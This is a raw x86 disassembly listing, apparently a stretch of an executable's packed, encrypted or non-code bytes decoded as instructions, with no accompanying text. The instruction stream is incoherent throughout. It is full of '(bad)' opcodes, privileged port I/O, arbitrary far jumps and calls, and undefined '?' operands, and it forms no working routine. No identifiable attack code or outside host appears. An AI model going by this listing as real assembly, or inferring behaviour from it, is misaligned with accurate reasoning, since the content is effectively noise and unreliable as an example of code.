  41b22b:	pop    ecx
  41b22c:	das    
  41b22d:	or     esi,DWORD PTR [esi-0x36]
  41b230:	dec    edi
  41b231:	rcr    BYTE PTR [edi],0xd2
  41b234:	gs inc esp
  41b236:	push   edi
  41b237:	or     eax,0x8ecb67f
  41b23c:	sbb    eax,0x4c175c1
  41b241:	out    dx,eax
  41b242:	ficomp DWORD PTR [eax+0x4b]
  41b245:	mov    ebp,?
  41b247:	push   ebp
  41b248:	pop    edi
  41b249:	cmp    esi,DWORD PTR [eax-0x5738bf7c]
  41b24f:	lock outs dx,BYTE PTR ds:[esi]
  41b251:	lahf   
  41b252:	and    BYTE PTR [esi-0x48],bh
  41b255:	mov    ah,0xb8
  41b257:	rol    ah,cl
  41b259:	pop    esi
  41b25a:	dec    ebx
  41b25b:	adc    BYTE PTR [edx],bl
  41b25d:	xor    DWORD PTR [edx],0x78
  41b260:	mov    ah,0xaa
  41b262:	sub    esp,DWORD PTR [ebp-0x49]
  41b265:	aad    0x8f
  41b267:	add    DWORD PTR [ecx+0x6a],eax
  41b26a:	std    
  41b26b:	dec    DWORD PTR [esi+0x198f35fd]
  41b271:	push   ds
  41b272:	mov    BYTE PTR [ecx+eax*4-0x58867247],bl
  41b279:	xor    DWORD PTR [ebx-0x58],edi
  41b27c:	in     eax,dx
  41b27d:	mov    esp,0xe2c02ecb
  41b282:	mov    WORD PTR [ecx+ebp*1-0x6e],gs
  41b286:	scas   eax,DWORD PTR es:[edi]
  41b287:	out    dx,eax
  41b288:	push   esi
  41b289:	test   DWORD PTR es:[ebp+eiz*8-0x3638d9e4],edi
  41b291:	cmp    eax,0x2eff79f1
  41b296:	int3   
  41b297:	test   eax,0xbc7c8e4e
  41b29c:	adc    ebp,DWORD PTR [esi+0x60da5aea]
  41b2a2:	add    BYTE PTR [ebp+0x263df838],bl
  41b2a8:	cmp    esi,esi
  41b2aa:	jmp    0x5fa3:0x180bd0ee
  41b2b1:	push   edx
  41b2b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2b3:	adc    DWORD PTR [esp+eiz*4],ebx
  41b2b6:	or     eax,0x1cf09013
  41b2bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2bc:	loop   0x41b2d3
  41b2be:	lods   eax,DWORD PTR ds:[esi]
  41b2bf:	fimul  WORD PTR es:[ecx-0x1d]
  41b2c3:	test   BYTE PTR [ebx-0x57402500],bl
  41b2c9:	in     al,dx
  41b2ca:	add    eax,0xde1e7d6
  41b2cf:	loop   0x41b2c0
  41b2d1:	stos   BYTE PTR es:[edi],al
  41b2d2:	push   esi
  41b2d3:	leave  
  41b2d4:	cmp    ebp,esi
  41b2d6:	frstor [eax+0x75eaff36]
  41b2dc:	data16 stc 
  41b2de:	dec    ecx
  41b2df:	(bad)  
  41b2e0:	push   ecx
  41b2e1:	ds pusha 
  41b2e3:	(bad)  
  41b2e4:	jg     0x41b34b
  41b2e6:	mov    gs,WORD PTR [esi+0x9ad9360]
  41b2ec:	fs push ds
  41b2ee:	jo     0x41b2d0
  41b2f0:	test   BYTE PTR [esi-0x6d],dh
  41b2f3:	(bad)  
  41b2f4:	jge    0x41b346
  41b2f6:	outs   dx,BYTE PTR ds:[esi]
  41b2f7:	cmp    bh,BYTE PTR [esi+esi*2]
  41b2fa:	push   ebx
  41b2fb:	ror    BYTE PTR [edx-0x57],cl
  41b2fe:	push   ecx
  41b2ff:	push   ebp
  41b300:	add    BYTE PTR [ebx-0x19e336b4],dh
  41b306:	out    0xef,al
  41b308:	adc    eax,0xaeaed926
  41b30d:	clc    
  41b30e:	xchg   edx,eax
  41b30f:	outs   dx,BYTE PTR ds:[esi]
  41b310:	mul    BYTE PTR [esi]
  41b312:	xchg   edx,eax
  41b313:	and    BYTE PTR [ecx+esi*8],0x19
  41b317:	push   edx
  41b318:	or     al,BYTE PTR [ebx+0x51]
  41b31b:	inc    esi
  41b31c:	fiadd  WORD PTR [eax-0x5ca1389d]
  41b322:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b323:	out    0xdb,eax
  41b325:	jp     0x41b39b
  41b327:	inc    ebx
  41b328:	pop    eax
  41b329:	push   edi
  41b32a:	xchg   DWORD PTR [ebx+0x33],esp
  41b32d:	imul   eax,DWORD PTR [edx+0x30],0xffffffa8
  41b331:	in     eax,dx
  41b332:	sub    DWORD PTR [ebx+eax*2-0x4560f0e],edi
  41b339:	add    ah,BYTE PTR [eax]
  41b33b:	xor    BYTE PTR [ebx+0x3a762f66],dl
  41b341:	test   eax,0x4e7f586d
  41b346:	aam    0x1
  41b348:	add    al,0xfc
  41b34a:	add    al,0xcb
  41b34c:	xchg   esi,eax
  41b34d:	xchg   ebx,eax
  41b34e:	fdivp  st(4),st
  41b350:	retf   
  41b351:	(bad)  
  41b352:	ss inc ecx
  41b354:	(bad)  
  41b355:	ins    DWORD PTR es:[edi],dx
  41b356:	adc    eax,0x2d1a2d52
  41b35b:	add    al,0xdb
  41b35d:	(bad)  
  41b35f:	fistp  QWORD PTR [edi+0x16b64319]
  41b365:	mov    dl,0xae
  41b367:	dec    ebp
  41b368:	nop
  41b369:	xor    DWORD PTR [eax+0x41],ebx
  41b36c:	ret    0xbad5
  41b36f:	pop    ecx
  41b370:	hlt    
  41b371:	jmp    0x8ee595bb
  41b376:	jo     0x41b3a2
  41b378:	and    ch,dh
  41b37a:	stc    
  41b37b:	adc    esp,DWORD PTR [ebx]
  41b37d:	xchg   ebx,eax
  41b37e:	data16 sub ch,ch
  41b381:	mov    dh,0x85
  41b383:	test   eax,0xeab1cae1
  41b388:	in     al,dx
  41b389:	mov    ebx,0xb58bd78b
  41b38e:	cli    
  41b38f:	mov    es:0x86741f87,al
  41b395:	call   0xc7275027
  41b39a:	repz and al,0x6f
  41b39d:	push   esi
  41b39e:	xor    dl,dl
  41b3a0:	xor    eax,0xe430170a
  41b3a5:	mov    edx,0xbf9f81e7
  41b3aa:	pop    ds
  41b3ab:	xchg   BYTE PTR [ebp+0x73],ch
  41b3ae:	mov    dh,0x2a
  41b3b0:	and    BYTE PTR [esi+ebx*2],dl
  41b3b3:	in     al,dx
  41b3b4:	or     BYTE PTR [eax],ch
  41b3b6:	jmp    0x41b395
  41b3b8:	(bad)  
  41b3b9:	jmp    DWORD PTR [edi-0x2b]
  41b3bc:	lea    ebx,[edi+0x22]
  41b3bf:	cmp    dh,al
  41b3c1:	or     al,0x68
  41b3c3:	pop    edi
  41b3c4:	inc    ecx
  41b3c5:	(bad)  [ecx+0x77]
  41b3c8:	outs   dx,DWORD PTR ds:[esi]
  41b3c9:	ins    BYTE PTR es:[edi],dx
  41b3ca:	mov    DWORD PTR [ebx+0x2ee62bf],esi
  41b3d0:	cmp    BYTE PTR [eax],bh
  41b3d2:	or     al,0xce
  41b3d4:	xchg   ebp,eax
  41b3d5:	mov    dh,0x45
  41b3d7:	leave  
  41b3d8:	sbb    DWORD PTR [ecx-0x1684d650],esp
  41b3de:	mov    esp,es
  41b3e0:	ret    
  41b3e1:	shr    DWORD PTR [ecx+0x3b],cl
  41b3e4:	sub    eax,0xdf56644
  41b3e9:	pop    DWORD PTR [edi]
  41b3eb:	call   0x99e3:0x6336ce49
  41b3f2:	dec    edi
  41b3f3:	repnz xlat BYTE PTR ds:[ebx]
  41b3f5:	mov    bh,0xc5
  41b3f7:	nop
  41b3f8:	cmp    DWORD PTR [eax+0x3ec42d48],0x3cfa82de
  41b402:	bound  ebx,QWORD PTR [ecx+0x76645053]
  41b408:	xchg   edx,eax
  41b409:	adc    edx,DWORD PTR [ecx+0x4412227c]
  41b40f:	cmp    BYTE PTR [ebp-0x3ac82f71],ch
  41b415:	lods   al,BYTE PTR ds:[esi]
  41b416:	push   ebx
  41b417:	pop    ss
  41b418:	(bad)  
  41b419:	aas    
  41b41a:	stos   DWORD PTR es:[edi],eax
  41b41b:	push   es
  41b41c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b41d:	aad    0x3a
  41b41f:	jnp    0x41b3d6
  41b421:	imul   ebp,DWORD PTR [ecx-0x7c336dab],0xd2d733d1
  41b42b:	jns    0x41b400
  41b42d:	cld    
  41b42e:	call   0xe960c7c6
  41b433:	mov    ch,0x42
  41b435:	fistp  DWORD PTR [ebx+0xc5ad6e4]
  41b43b:	inc    ecx
  41b43c:	test   BYTE PTR [ebx+0xa3ecfd2],ch
  41b442:	lds    ebx,FWORD PTR [edi]
  41b444:	fnsave [eax+0x1bb02120]
  41b44a:	aam    0xeb
  41b44c:	jmp    0x808e:0xc8ac5042
  41b453:	outs   dx,BYTE PTR ds:[esi]
  41b454:	push   ecx
  41b455:	in     eax,dx
  41b456:	xchg   ebp,eax
  41b457:	push   ecx
  41b458:	(bad)  
  41b459:	retf   0xea46
  41b45c:	push   eax
  41b45d:	xchg   esi,eax
  41b45e:	mov    eax,0x82f242b
  41b463:	dec    ecx
  41b464:	loope  0x41b48f
  41b466:	sub    BYTE PTR [ecx+0x53],cl
  41b469:	js     0x41b4ca
  41b46b:	js     0x41b49d
  41b46d:	retf   
  41b46e:	jle    0x41b40e
  41b470:	in     eax,dx
  41b471:	rol    DWORD PTR ds:0x7d6905c1,0xb8
  41b478:	into   
  41b479:	cwde   
  41b47a:	pop    edi
  41b47b:	xor    esp,edi
  41b47d:	cmp    eax,0x7dc37f4b
  41b482:	out    dx,eax
  41b483:	adc    BYTE PTR [ecx-0x79e9b053],ah
  41b489:	xor    DWORD PTR [ebx-0x49],0xffffff84
  41b48d:	dec    esp
  41b48e:	sbb    ebp,DWORD PTR [eax+0x1eac711d]
  41b494:	sar    eax,0x56
  41b497:	mov    ch,0xb6
  41b499:	inc    edx
  41b49a:	sbb    DWORD PTR [edi-0x1c985ccd],0x7d
  41b4a1:	xchg   esp,eax
  41b4a2:	add    esi,ecx
  41b4a4:	push   edi
  41b4a5:	xchg   ebx,eax
  41b4a6:	pop    ecx
  41b4a7:	sub    dh,dh
  41b4a9:	push   0x5b
  41b4ab:	push   eax
  41b4ac:	inc    edx
  41b4ad:	ret    
  41b4ae:	jge    0x41b448
  41b4b0:	ja     0x41b514
  41b4b2:	mov    ah,bl
  41b4b4:	rcr    BYTE PTR [edx],0xcc
  41b4b7:	mov    eax,0xe85381c9
  41b4bc:	ja     0x41b4e4
  41b4be:	int    0xee
  41b4c0:	je     0x41b51f
  41b4c2:	push   0xffffffc6
  41b4c4:	jge    0x41b455
  41b4c6:	add    eax,0xc1dd7834
  41b4cb:	and    edx,DWORD PTR [eax+0x55]
  41b4ce:	das    
  41b4cf:	test   DWORD PTR [edx+0x2d243d0e],edx
  41b4d5:	(bad)  
  41b4d6:	in     eax,0x10
  41b4d8:	shl    DWORD PTR [eax+0x7a],cl
  41b4db:	mov    ds:0x18bceab0,al
  41b4e0:	xchg   DWORD PTR [edi+eax*4-0x4b767ea8],ecx
  41b4e7:	xor    edx,DWORD PTR [edx]
  41b4e9:	mov    ebp,0x656bc5cc
  41b4ee:	add    edx,DWORD PTR [ecx]
  41b4f0:	mov    edi,0x7c2c29e4
  41b4f5:	pop    edi
  41b4f6:	inc    edx
  41b4f7:	and    edi,DWORD PTR [ecx]
  41b4f9:	fcomp  QWORD PTR [eax+0xa]
  41b4fc:	jecxz  0x41b57a
  41b4fe:	mov    ecx,0xaa6f31a3
  41b503:	hlt    
  41b504:	loop   0x41b4ff
  41b506:	jno    0x41b49f
  41b508:	jnp    0x41b4ff
  41b50a:	pop    es
  41b50b:	in     eax,0x11
  41b50d:	ins    DWORD PTR es:[edi],dx
  41b50e:	mov    al,dh
  41b510:	out    0xd2,eax
  41b512:	pop    esi
  41b513:	fdiv   QWORD PTR [ecx-0x13]
  41b516:	test   eax,0x166f3c73
  41b51b:	xor    DWORD PTR [esi+0x26],edi
  41b51e:	cmp    cl,dh
  41b520:	test   BYTE PTR [ebx],0x7f
  41b523:	stos   BYTE PTR es:[edi],al
  41b524:	leave  
  41b525:	imul   eax,DWORD PTR [edi-0x5a08b8ec],0x50
  41b52c:	push   ecx
  41b52d:	arpl   bx,si
  41b52f:	xor    eax,0x645d1781
  41b534:	stos   BYTE PTR es:[edi],al
  41b535:	mov    ecx,0xc49c9aa2
  41b53a:	push   0x7e0b1075
  41b53f:	ror    DWORD PTR [eax],cl
  41b541:	adc    dl,BYTE PTR [ecx-0x1693de94]
  41b547:	cs ds scas eax,DWORD PTR es:[edi]
  41b54a:	pop    edx
  41b54b:	xchg   esi,eax
  41b54c:	out    0x59,al
  41b54e:	repz sbb eax,0xcec67327
  41b554:	dec    eax
  41b555:	cmp    eax,0xd7abe8cb
  41b55a:	mov    edi,0x42b2fcb4
  41b55f:	outs   dx,BYTE PTR ds:[esi]
  41b560:	mov    edi,0xd17333f
  41b565:	pop    ebp
  41b566:	jae    0x41b599
  41b568:	xchg   ecx,eax
  41b569:	jge    0x41b560
  41b56b:	mov    ebx,0x33884524
  41b570:	punpckhbw mm0,QWORD PTR [edx-0x633aa300]
  41b577:	test   DWORD PTR [eax],ebx
  41b579:	sub    eax,DWORD PTR [ecx]
  41b57b:	lods   al,BYTE PTR ds:[esi]
  41b57c:	gs pusha 
  41b57e:	stos   DWORD PTR es:[edi],eax
  41b57f:	and    eax,0xa3393aa1
  41b584:	inc    esp
  41b585:	retf   
  41b586:	adc    edi,esi
  41b588:	and    bh,BYTE PTR [ebp-0x194bfb9e]
  41b58e:	cdq    
  41b58f:	pushf  
  41b590:	fwait
  41b591:	aaa    
  41b592:	pop    ecx
  41b593:	jae    0x41b5e9
  41b595:	pop    es
  41b596:	aad    0xc6
  41b598:	dec    ecx
  41b599:	pop    ecx
  41b59a:	xor    dl,BYTE PTR [ebp-0xc]
  41b59d:	(bad)  
  41b59e:	pop    es
  41b59f:	loope  0x41b602
  41b5a1:	jns    0x41b5cc
  41b5a3:	push   edx
  41b5a4:	out    dx,eax
  41b5a5:	cmp    DWORD PTR [ebx-0x4186264c],edi
  41b5ab:	sub    esp,esi
  41b5ad:	mov    ebp,0x55abe83c
  41b5b2:	test   eax,ebp
  41b5b4:	nop
  41b5b5:	dec    esp
  41b5b6:	icebp  
  41b5b7:	dec    ecx
  41b5b8:	inc    ebx
  41b5b9:	ss pop edi
  41b5bb:	adc    eax,0x797ad603
  41b5c0:	inc    esp
  41b5c1:	call   0x8cfd21e
  41b5c6:	daa    
  41b5c7:	test   al,0x75
  41b5c9:	gs je  0x41b5be
  41b5cc:	push   edi
  41b5cd:	(bad)  
  41b5ce:	stc    
  41b5cf:	jmp    0x494582f3
  41b5d4:	adc    DWORD PTR [ecx-0x3a],ebp
  41b5d7:	mov    eax,ds:0x76d358b4
  41b5dc:	adc    DWORD PTR [ebx],esp
  41b5de:	outs   dx,DWORD PTR ds:[esi]
  41b5df:	aas    
  41b5e0:	lods   al,BYTE PTR ds:[esi]
  41b5e1:	jne    0x41b5d9
  41b5e3:	jmp    0x6a70:0xd3ed0a77
  41b5ea:	adc    dl,BYTE PTR [eax+ebx*4-0x5fef8c20]
  41b5f1:	mov    ch,0x6d
  41b5f3:	inc    ebp
  41b5f4:	pushf  
  41b5f5:	add    cl,BYTE PTR [ecx+0x9dca0c5]
  41b5fb:	push   esi
  41b5fc:	aam    0x49
  41b5fe:	inc    ecx
  41b5ff:	daa    
  41b600:	mov    ds:0xfec9eb6a,al
  41b605:	push   0xc17082ca
  41b60a:	jmp    0xd720:0x2011bfcd
  41b611:	xchg   BYTE PTR [edx],ch
  41b613:	mov    dl,ch
  41b615:	aaa    
  41b616:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b617:	enter  0xac3,0x3b
  41b61b:	hlt    
  41b61c:	pop    ecx
  41b61d:	(bad)  
  41b61e:	push   ebx
  41b61f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b620:	xor    al,0xd5
  41b622:	sub    bh,bh
  41b624:	rcr    BYTE PTR [ebx-0x34725414],1
  41b62a:	sar    BYTE PTR [ebx+0x3e],1
  41b62d:	sub    BYTE PTR [esi+0x10d5b8bb],0x85
  41b634:	rol    BYTE PTR [ecx-0x57],cl
  41b637:	sbb    eax,0xdc587a0c
  41b63c:	or     BYTE PTR [ecx],al
  41b63e:	leave  
  41b63f:	jecxz  0x41b5ed
  41b641:	mov    ds:0xf5520fdc,al
  41b646:	in     al,dx
  41b647:	mov    DWORD PTR [edx-0x59],edx
  41b64a:	xchg   ebp,eax
  41b64b:	xor    ebp,DWORD PTR ds:0x3797df60
  41b651:	sbb    al,0xde
  41b653:	dec    ebx
  41b654:	jl     0x41b5e2
  41b656:	xchg   edx,eax
  41b657:	and    BYTE PTR [ecx-0x9],ah
  41b65a:	xchg   ebx,eax
  41b65b:	jmp    0x41b685
  41b65d:	dec    ebp
  41b65e:	fdiv   DWORD PTR [eax+0x5268f51c]
  41b664:	test   eax,0x63828d54
  41b669:	add    eax,0x5a2006fc
  41b66e:	das    
  41b66f:	xor    eax,0xaadc1677
  41b674:	fs es arpl dx,sp
  41b678:	push   0xffffffa0
  41b67a:	mov    al,0xb4
  41b67c:	xor    ebx,DWORD PTR [edx+0x6b99e873]
  41b682:	retf   0xb53f
  41b685:	hlt    
  41b686:	aam    0x71
  41b688:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b689:	outs   dx,BYTE PTR ds:[esi]
  41b68a:	inc    ebp
  41b68b:	jecxz  0x41b61b
  41b68d:	xor    al,0x7
  41b68f:	rcl    BYTE PTR gs:[ebx],0xb6
  41b693:	lea    ebp,[esi+0x4e4c4890]
  41b699:	(bad)  
  41b69a:	in     al,dx
  41b69b:	fdivr  QWORD PTR [ebx+0x784fdb5f]
  41b6a1:	cwde   
  41b6a2:	jno    0x41b704
  41b6a4:	in     al,0x2d
  41b6a6:	sar    ch,0xe
  41b6a9:	dec    ebx
  41b6aa:	repnz (bad)
  41b6ad:	imul   esp,eax,0xd6836055
  41b6b3:	dec    ebp
  41b6b4:	fs aas 
  41b6b6:	lock jg 0x41b6e9
  41b6b9:	xor    ch,BYTE PTR [ebp+ecx*4+0x7c]
  41b6bd:	sti    
  41b6be:	sbb    esp,DWORD PTR [eax+0x458a3ff0]
  41b6c4:	mov    al,ds:0xe9e1d82b
  41b6c9:	xchg   ebp,eax
  41b6ca:	mov    ebx,0x330257a
  41b6cf:	and    al,0xc6
  41b6d1:	mov    eax,ds:0x5a66618a
  41b6d6:	out    dx,eax
  41b6d7:	mov    ds:0xae45da2b,eax
  41b6dc:	xchg   DWORD PTR [eax],edi
  41b6de:	into   
  41b6df:	xor    eax,0x3378b50e
  41b6e4:	out    dx,eax
  41b6e5:	mov    dh,BYTE PTR [ecx]
  41b6e7:	or     eax,edi
  41b6e9:	mov    ch,0xea
  41b6eb:	dec    eax
  41b6ec:	mov    al,0x6c
  41b6ee:	mov    ah,0xf8
  41b6f0:	xchg   edx,eax
  41b6f1:	test   BYTE PTR [ebx+ebp*2],ch
  41b6f4:	fist   WORD PTR [eax+0x3c60ce19]
  41b6fa:	adc    eax,0xac0209f6
  41b6ff:	inc    edx
  41b700:	jae    0x41b6fa
  41b702:	pop    esp
  41b703:	jbe    0x41b6d6
  41b705:	xchg   BYTE PTR [ecx+0x348f4101],dl
  41b70b:	mov    ah,0x94
  41b70d:	sbb    DWORD PTR [ebx+eiz*8-0x63aa4d19],edi
  41b714:	cmp    DWORD PTR [edi-0x55],ecx
  41b717:	std    
  41b718:	adc    esi,DWORD PTR [ebx+0x584c582f]
  41b71e:	out    0x66,al
  41b720:	jmp    0x5d339db3
  41b725:	cmp    ah,cl
  41b727:	iret   
  41b728:	pop    edx
  41b729:	add    eax,0x4340d5b9
  41b72e:	dec    eax
  41b72f:	or     edx,DWORD PTR [edx+0x68]
  41b732:	push   cs
  41b733:	jp     0x41b6fe
  41b735:	mov    al,0xfc
  41b737:	or     DWORD PTR ds:0x14bb01f0,ebp
  41b73d:	test   DWORD PTR [ecx],edi
  41b73f:	jo     0x41b79a
  41b741:	stos   DWORD PTR es:[edi],eax
  41b742:	adc    bh,al
  41b744:	loopne 0x41b751
  41b746:	adc    eax,0xb0826ad7
  41b74b:	and    al,0xa4
  41b74d:	dec    esi
  41b74e:	sbb    DWORD PTR [eax],esi
  41b750:	mov    esp,0x39b766b6
  41b755:	ss lahf 
  41b757:	call   0x9221:0xb6c727d8
  41b75e:	inc    ecx
  41b75f:	fadd   st(0),st
  41b761:	inc    edi
  41b762:	jno    0x41b6f3
  41b764:	mov    al,0xa6
  41b766:	bound  eax,QWORD PTR [eax+0x70]
  41b769:	bound  edi,QWORD PTR [eax-0x75ed3aad]
  41b76f:	adc    ecx,DWORD PTR [esi]
  41b771:	push   ebp
  41b772:	xor    BYTE PTR [ebp+0x12],0xff
  41b776:	xchg   BYTE PTR [ecx+0x78],al
  41b779:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b77a:	xchg   edi,eax
  41b77b:	xchg   BYTE PTR ds:0x11a57a32,al
  41b781:	in     al,dx
  41b782:	fcom   DWORD PTR [ebx-0x6]
  41b785:	ins    BYTE PTR es:[edi],dx
  41b786:	cli    
  41b787:	sub    dl,BYTE PTR [esi+ebx*2-0x116d51de]
  41b78e:	das    
  41b78f:	in     al,dx
  41b790:	pop    ds
  41b791:	in     eax,0xe4
  41b793:	shl    DWORD PTR [edx],0x69
  41b796:	stc    
  41b797:	ret    0xe746
  41b79a:	cmp    BYTE PTR [ebp+0x3a30a943],bh
  41b7a0:	rcl    dh,cl
  41b7a2:	xor    al,0xf6
  41b7a4:	mov    ecx,0xfa909481
  41b7a9:	test   DWORD PTR [edx-0xb],edi
  41b7ac:	outs   dx,DWORD PTR ds:[esi]
  41b7ad:	cdq    
  41b7ae:	popf   
  41b7af:	xchg   ecx,eax
  41b7b0:	sub    ebx,ebp
  41b7b2:	icebp  
  41b7b3:	mov    ah,0xbf
  41b7b5:	je     0x41b7e4
  41b7b7:	mov    bh,0x81
  41b7b9:	in     al,0xe
  41b7bb:	jae    0x41b799
  41b7bd:	jle    0x41b803
  41b7bf:	jno    0x41b781
  41b7c1:	loopne 0x41b7fe
  41b7c3:	(bad)  
  41b7c4:	cld    
  41b7c5:	test   al,0x5c
  41b7c7:	fiadd  DWORD PTR [edi]
  41b7c9:	retf   
  41b7ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b7cb:	xchg   ecx,eax
  41b7cc:	js     0x41b752
  41b7ce:	or     eax,ecx
  41b7d0:	xchg   esi,eax
  41b7d1:	mov    bh,0x85
  41b7d3:	in     eax,0x52
  41b7d5:	pop    esp
  41b7d6:	jno    0x41b7c9
  41b7d8:	sub    al,0x6d
  41b7da:	loope  0x41b7e5
  41b7dc:	retf   0xd0a1
  41b7df:	(bad)  
  41b7e0:	push   edx
  41b7e1:	xchg   ecx,eax
  41b7e2:	lods   al,BYTE PTR ds:[esi]
  41b7e3:	pop    esi
  41b7e4:	(bad)  
  41b7e5:	jle    0x41b839
  41b7e7:	xor    al,0xd2
  41b7e9:	fild   QWORD PTR [eax+0x511b379c]
  41b7ef:	mov    ch,0xa6
  41b7f1:	pop    eax
  41b7f2:	push   esp
  41b7f3:	jg     0x41b7f1
  41b7f5:	or     al,0x5b
  41b7f7:	sbb    BYTE PTR [eax+esi*1+0x2c],ah
  41b7fb:	sub    al,0xd3
  41b7fd:	out    0x89,eax
  41b7ff:	inc    esp
  41b800:	test   al,0xea
  41b802:	out    0x73,eax
  41b804:	pop    es
  41b805:	cmp    ah,al
  41b807:	jae    0x41b7cc
  41b809:	nop
  41b80a:	push   ecx
  41b80b:	mov    ds,WORD PTR [eax*8+0x4cf62527]
  41b812:	inc    ebp
  41b813:	jmp    0x6c7d:0xb240c204
  41b81a:	hlt    
  41b81b:	ret    
  41b81c:	pop    eax
  41b81d:	test   esp,edi
  41b81f:	shl    dl,0xb8
  41b822:	jne    0x41b7e7
  41b824:	sub    esi,0x9c3fb364
  41b82a:	bound  ebp,QWORD PTR [ebp+0x1c]
  41b82d:	dec    edx
  41b82e:	and    bl,BYTE PTR [ebx-0x38]
  41b831:	mov    ds:0xa7e2fc3f,eax
  41b836:	push   0x5a
  41b838:	(bad)  
  41b83a:	ins    BYTE PTR es:[edi],dx
  41b83b:	jle    0x41b848
  41b83d:	adc    bh,ch
  41b83f:	mov    ecx,ebx
  41b841:	pop    ecx
  41b842:	or     DWORD PTR [esi+eiz*4+0xb741270],eax
  41b849:	mov    esp,0xb6576b18
  41b84e:	sbb    esi,DWORD PTR [ecx]
  41b850:	cmp    bh,BYTE PTR [ebx-0xb]
  41b853:	test   BYTE PTR [ebx-0x5e],ch
  41b856:	imul   ebx,esi,0xffffffec
  41b859:	xor    al,0xd5
  41b85b:	sub    ecx,eax
  41b85d:	jl     0x41b860
  41b85f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b860:	mov    eax,ds:0x234e2703
  41b865:	jae    0x41b8e6
  41b867:	mov    ch,bh
  41b869:	repz addr16 iret 
  41b86c:	dec    ecx
  41b86d:	jns    0x41b811
  41b86f:	scas   al,BYTE PTR es:[edi]
  41b870:	mov    esi,ds
  41b872:	mov    DWORD PTR [eax+0xd],edi
  41b875:	fnstenv [ecx+0x57]
  41b878:	jns    0x41b879
  41b87a:	shr    DWORD PTR [ecx+eiz*4],0x27
  41b87e:	cmp    dl,BYTE PTR [edi-0x5ba11f18]
  41b884:	jo     0x41b899
  41b886:	jge    0x41b905
  41b888:	imul   edx,DWORD PTR ds:0x309f1b16,0x1c9cb136
  41b892:	ret    0xf3d6
  41b895:	dec    ebx
  41b896:	jmp    0xfa0d5725
  41b89b:	mov    ds:0xb1252f20,eax
  41b8a0:	or     al,0xf8
  41b8a2:	not    DWORD PTR [ebp+0x5d79304d]
  41b8a8:	jnp    0x41b8a3
  41b8aa:	mov    esp,0x68ec8790
  41b8af:	shl    ebx,cl
  41b8b1:	inc    ebx
  41b8b2:	xor    al,0x63
  41b8b4:	inc    eax
  41b8b5:	int    0x8f
  41b8b7:	xchg   BYTE PTR [ebx-0x2e],cl
  41b8ba:	ficom  DWORD PTR [edx-0x4bef9f54]
  41b8c0:	pusha  
  41b8c1:	call   0x81f4:0x1f1d6f91
  41b8c8:	(bad)  [edx-0x2100b567]
  41b8ce:	cld    
  41b8cf:	jmp    0x8bc1:0x73e7642e
  41b8d6:	pop    es
  41b8d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8d8:	or     cl,BYTE PTR [ebx+0x45bc250f]
  41b8de:	or     eax,0x54354778
  41b8e3:	lods   eax,DWORD PTR ds:[esi]
  41b8e4:	sub    DWORD PTR [edi+0x3bdc910e],edi
  41b8ea:	(bad)  
  41b8eb:	rcr    bl,cl
  41b8ed:	fadd   st,st(7)
  41b8ef:	(bad)  
  41b8f0:	imul   ebx,DWORD PTR [edx+0x7501a0bd],0xe800f089
  41b8fa:	test   BYTE PTR [eax],al
  41b8fc:	jno    0x41b8c4
  41b8fe:	into   
  41b8ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b900:	dec    esp
  41b901:	add    eax,0xaf49aa8e
  41b906:	fwait
  41b907:	xor    DWORD PTR [edx+eax*2+0x4aec479e],0xffffffd6
  41b90f:	jbe    0x41b98d
  41b911:	mov    eax,0xaab9ac10
  41b916:	fs adc ebp,ebp
  41b919:	mov    cl,0xa1
  41b91c:	xor    DWORD PTR [eax-0x63],ebx
  41b91f:	jns    0x41b925
  41b921:	jae    0x41b975
  41b923:	push   0xea050b5
  41b928:	retf   0xcebd
  41b92b:	popf   
  41b92c:	push   ds
  41b92d:	or     bl,bl
  41b92f:	mov    ebp,0x98a44bd
  41b934:	bound  ebx,QWORD PTR [ebp+0x4c]
  41b937:	lods   al,BYTE PTR ds:[esi]
  41b938:	je     0x41b9ae
  41b93a:	pop    ebp
  41b93b:	sbb    BYTE PTR [ecx-0xe74d2f6],bh
  41b941:	sub    al,0xa6
  41b943:	inc    eax
  41b944:	fdiv   st(0),st
  41b946:	(bad)  
  41b947:	stc    
  41b948:	retf   
  41b949:	es cmc 
  41b94b:	frstor [edx+0x63]
  41b94e:	adc    DWORD PTR fs:[eax+ebp*2+0x21],esi
  41b953:	mov    dh,0xbb
  41b955:	fwait
  41b956:	cmp    eax,0x2d7f3c71
  41b95b:	jnp    0x41b8fd
  41b95d:	les    edi,FWORD PTR [ebp-0x15]
  41b960:	mov    DWORD PTR [esi+0x6],eax
  41b963:	sub    ecx,DWORD PTR [ebp-0x192a54a5]
  41b969:	daa    
  41b96a:	fisttp DWORD PTR [edi]
  41b96c:	ret    0x641b
  41b96f:	jae    0x41b9d7
  41b971:	mov    edx,esp
  41b973:	pusha  
  41b974:	adc    BYTE PTR [ecx-0x6cef6fd6],bl
  41b97a:	rcr    DWORD PTR [edx],1
  41b97c:	dec    BYTE PTR [eax]
  41b97e:	jne    0x41b9c1
  41b980:	jns    0x41b9fe
  41b982:	adc    eax,0x2b47614
  41b987:	scas   eax,DWORD PTR es:[edi]
  41b988:	mov    edx,0x4ef5e734
  41b98d:	test   DWORD PTR [eax+0x19f2900a],0x93a47cd1
  41b997:	test   esp,eax
  41b999:	mov    ?,WORD PTR [ebx+0xed5bd5b]
  41b99f:	adc    al,0x94
  41b9a1:	sbb    al,BYTE PTR [ebx-0x59]
  41b9a4:	sbb    DWORD PTR [esi-0x74],esi
  41b9a7:	nop
  41b9a8:	dec    edi
  41b9a9:	adc    BYTE PTR [ebp+0x8d290cb],dh
  41b9af:	jmp    0x41b9b3
  41b9b1:	ret    0xc740
  41b9b4:	into   
  41b9b5:	iret   
  41b9b6:	lahf   
  41b9b7:	iret   
  41b9b8:	sub    al,0xd8
  41b9ba:	dec    ecx
  41b9bb:	sti    
